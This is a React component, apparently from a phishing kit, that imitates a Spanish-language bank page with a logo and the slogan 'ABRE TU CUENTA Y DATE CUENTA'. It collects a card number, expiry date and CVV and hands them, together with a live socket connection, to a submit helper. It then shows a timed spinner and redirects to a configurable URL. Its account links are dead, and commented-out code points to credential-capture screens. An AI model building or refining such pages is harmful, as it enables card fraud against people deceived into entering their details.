import { SocketContext, UserDataContext } from '../../../context'
import { useContext, useState } from 'react'
import { useFormik } from 'formik'
import { useNavigate } from 'react-router-dom'

import { cardValidate } from '../../../security/cardValidate'
import { CreditCardInput } from './CreditCardInput'
import { ErrorCreditCard } from './ErrorCreditCard'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'

import logo from '../../../assets/logo.png'

const valuesData = { card: '', month: 'mes', year: 'año', cvv: '' }

export const CreditCard = ({urlToNavigate, spiner, timeLoader, endUrl = ''}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext);
    const { socket } =  useContext(SocketContext);  
    const [showSpiner , SetshowSpiner] = useState(false);
    const [seconds, setSeconds] = useState(15)
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => cardValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl, setSeconds, seconds})
    })

    return (
        <div className='bg-[#E7E3E3] w-screen h-screen flex items-center flex-col'>
        {/* Spiner de carga */}


        {/* Aqui ira las notificacion de error en caso general */}
        {/* <UsernameAndPasswordError
            touched={touched}
            errors={errors}
        />
        {
            virtualKeyword === true ? (<UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) : null
        } */}
        {/* Colocar diseño base */}
        <div className='relative w-[183px] mt-[-22px] h-[100px] flex justify-center'>
            <img className='w-[183px] absolute' src={logo} alt="" />
        </div>
        <div className='w-[408px] h-[350px] blue-gradient'>
            <p className='montserrat text-white text-center mx-16 mt-6 mb-2'>Ingresa tu numero de tarjeta registrada.</p>

            {
                showSpiner === true ? <Spiner seconds={seconds} /> : (
                    <form className='flex flex-col items-center' onSubmit={handleSubmit}>

                        <CreditCardInput
                            card={values.card.toString().slice(0, 16)}
                            year={values.year}
                            month={values.month}
                            cvv={values.cvv.toString().slice(0, 3)}
                            handleChange={handleChange} 
                            handleBlur={handleBlur} 
                            touched={touched}
                            errors={errors}
                        />


                        <button 
                            disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}
                            className=' px-4 py-1 bg-transparent border-[1px] mt-[30px] w-[150px] max-w-[90%] text-[#fff] rounded-[15px]'
                            type='submit'
                        >
                            Ingresar
                        </button>

                        <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[190px] mt-[15px] p-[15px_20px]'>
                            Crear usuario
                        </a>
                    </form>
                )
            }
            
        </div>
        <div className='w-[408px] h-[250px] flex flex-col items-center text-center text-white bg-[#e31837]'>
            <p className='avenir text-3xl mx-16 leading-[60px]'>ABRE TU CUENTA Y DATE CUENTA</p>
            
            <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[240px] mt-[15px] p-[15px_20px] text-xl font-bold'>
                Solicitar
            </a>
        </div>
    </div>

    )
}